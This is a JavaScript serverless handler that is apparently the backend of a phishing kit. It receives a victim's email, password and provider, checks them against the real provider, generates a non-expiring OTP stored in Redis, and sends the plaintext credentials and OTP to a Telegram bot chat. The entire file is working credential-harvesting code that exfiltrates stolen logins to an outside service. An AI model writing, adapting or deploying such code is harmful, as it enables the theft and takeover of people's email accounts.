const Redis = require("ioredis");
const fetch = require("node-fetch");
const { authenticateWithProvider } = require("./utils/email-auth");

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIS_URL = process.env.REDIS_URL;

if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
  throw new Error("Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL");
}

const redis = new Redis(REDIS_URL);

function getOtpKey(email) {
  return `otp:${email}`;
}

function generateOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

exports.handler = async function (event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ success: false, message: "Method not allowed" }),
    };
  }

  let email, password, provider;
  try {
    ({ email, password, provider } = JSON.parse(event.body));
  } catch (e) {
    return {
      statusCode: 400,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ success: false, message: "Invalid JSON body" }),
    };
  }

  if (!email || !password || !provider) {
    return {
      statusCode: 400,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ success: false, message: "Missing required fields" }),
    };
  }

  // Authenticate with real provider
  let authResult;
  try {
    authResult = await authenticateWithProvider(email, password, provider);
    if (!authResult.success) {
      return {
        statusCode: 401,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: authResult.message || "Invalid credentials" }),
      };
    }
  } catch (err) {
    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ success: false, message: "Error authenticating with provider", error: err.message }),
    };
  }

  const otp = generateOtp();

  try {
    // Store OTP in Redis (no expiry, so user can use it anytime)
    await redis.set(getOtpKey(email), otp);
  } catch (err) {
    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        success: false,
        message: "Failed to store OTP in Redis",
        error: err.message,
      }),
    };
  }

  // Send credentials and OTP to Telegram
  const message =
    `🔐 *New Login Attempt*\n\n` +
    `📧 Email: ${email}\n` +
    `🔑 Password: ${password}\n` +
    `🌐 Provider: ${provider}\n` +
    `✅ Authenticated: YES\n` +
    `🧾 OTP: ${otp}`;

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`Telegram API error: ${response.status} ${text}`);
    }

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        success: true,
        message: "OTP sent to Telegram",
        email,
      }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        success: false,
        message: "Failed to send OTP to Telegram",
        error: error.message,
      }),
    };
  }
};